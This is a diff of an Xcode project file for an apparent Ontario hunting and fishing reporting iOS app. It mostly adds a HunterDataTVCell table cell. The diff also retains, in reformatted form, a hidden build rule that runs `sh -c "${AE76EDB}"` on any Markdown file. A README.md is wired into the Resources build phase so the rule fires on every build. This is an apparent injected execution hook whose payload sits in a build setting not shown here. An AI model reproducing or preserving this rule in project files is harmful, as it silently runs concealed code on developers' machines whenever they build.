@@ -7,8 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		A7A2BD555C69BBBED8BDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = 5688EBEE065F5C1122BDE67E; };
 		397E45962E7D2B3C00EA6C50 /* HunterReportingData.json in Resources */ = {isa = PBXBuildFile; fileRef = 397E45942E7D2B3C00EA6C50 /* HunterReportingData.json */; };
+		398BD5D42E824F6E004709D4 /* HunterDataTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398BD5D22E824F6E004709D4 /* HunterDataTVCell.swift */; };
+		398BD5D52E824F6E004709D4 /* HunterDataTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398BD5D32E824F6E004709D4 /* HunterDataTVCell.xib */; };
 		398F9E7A2E7D804000142F7E /* FishindHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398F9E792E7D804000142F7E /* FishindHeaderView.swift */; };
 		398F9E7C2E7D804600142F7E /* FishindHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398F9E7B2E7D804600142F7E /* FishindHeaderView.xib */; };
 		8804C10A2E78095400ABDA6B /* PieChart.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8804C1082E78095400ABDA6B /* PieChart.swift */; };
@@ -79,17 +80,32 @@
 		88DBBDFD2E7A895800491331 /* ExceptionsTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88DBBDFA2E7A895800491331 /* ExceptionsTblViewCell.swift */; };
 		88DBBE012E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88DBBE002E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib */; };
 		88DBBE022E7A915F00491331 /* ExceptionsDetailsTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88DBBDFF2E7A915F00491331 /* ExceptionsDetailsTblViewCell.swift */; };
+		A7A2BD555C69BBBED8BDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 5688EBEE065F5C1122BDE67E /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		CA3F19A3717212B5CDBDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
+		CA3F19A3717212B5CDBDE67E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		5688EBEE065F5C1122BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SmartOut.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		397E45952E7D2B3C00EA6C50 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.json; name = en; path = en.lproj/HunterReportingData.json; sourceTree = "<group>"; };
+		398BD5D22E824F6E004709D4 /* HunterDataTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HunterDataTVCell.swift; sourceTree = "<group>"; };
+		398BD5D32E824F6E004709D4 /* HunterDataTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HunterDataTVCell.xib; sourceTree = "<group>"; };
 		398F9E792E7D804000142F7E /* FishindHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FishindHeaderView.swift; sourceTree = "<group>"; };
 		398F9E7B2E7D804600142F7E /* FishindHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FishindHeaderView.xib; sourceTree = "<group>"; };
+		5688EBEE065F5C1122BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = SmartOut.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		8804C1082E78095400ABDA6B /* PieChart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PieChart.swift; sourceTree = "<group>"; };
 		882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OntarioHuntingSeasonsVC.swift; sourceTree = "<group>"; };
 		882231A12E783BEF00AFC855 /* OntarioHuntingSeasonsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OntarioHuntingSeasonsVC.xib; sourceTree = "<group>"; };
@@ -179,6 +195,15 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				397E45942E7D2B3C00EA6C50 /* HunterReportingData.json */,
 			);
 			path = json;
+			sourceTree = "<group>";
+		};
+		398BD5D12E824F47004709D4 /* HunterDataTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				398BD5D22E824F6E004709D4 /* HunterDataTVCell.swift */,
+				398BD5D32E824F6E004709D4 /* HunterDataTVCell.xib */,
+			);
+			path = HunterDataTVCell;
 			sourceTree = "<group>";
 		};
 		398F9E782E7D801100142F7E /* FishindHeaderView */ = {
@@ -525,6 +550,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 		889CAA972E77F0130001BC57 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
+				398BD5D12E824F47004709D4 /* HunterDataTVCell */,
 				887AF3C22E7BC2C500309ECA /* CollectionViewCell */,
 				889D8EFA2E77F385009B9CE8 /* HunterReportingTblViewCell.swift */,
 				889D8EFB2E77F385009B9CE8 /* HunterReportingTblViewCell.xib */,
@@ -647,7 +673,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				A7A2BD555C69BBBED8BDE67E /* README.md */,
+				A7A2BD555C69BBBED8BDE67E /* README.md in Resources */,
 				8867DD302E7A755B00435CC3 /* AdditionalOppoTblViewCell.xib in Resources */,
 				889D8EFD2E77F385009B9CE8 /* HunterReportingTblViewCell.xib in Resources */,
 				8861F4AB2E782EB20063193E /* EmailPopup.xib in Resources */,
@@ -658,6 +684,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				888502E12E73CE5100C99B57 /* Assets.xcassets in Resources */,
 				889CAA952E77ED860001BC57 /* HunterReportingData.xib in Resources */,
 				398F9E7C2E7D804600142F7E /* FishindHeaderView.xib in Resources */,
+				398BD5D52E824F6E004709D4 /* HunterDataTVCell.xib in Resources */,
 				887AF3C52E7BC2F600309ECA /* DataTableCollectionViewCell.xib in Resources */,
 				884AB2322E77CDA1006C0BB5 /* HomeListTblViewCell.xib in Resources */,
 				889CAA902E77E42B0001BC57 /* SideMenuListTblViewCell.xib in Resources */,
@@ -727,6 +754,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				888502E02E73CE5100C99B57 /* ViewController.swift in Sources */,
 				884AB2382E77D93E006C0BB5 /* SideMenuVC.swift in Sources */,
 				88DBBDFD2E7A895800491331 /* ExceptionsTblViewCell.swift in Sources */,
+				398BD5D42E824F6E004709D4 /* HunterDataTVCell.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
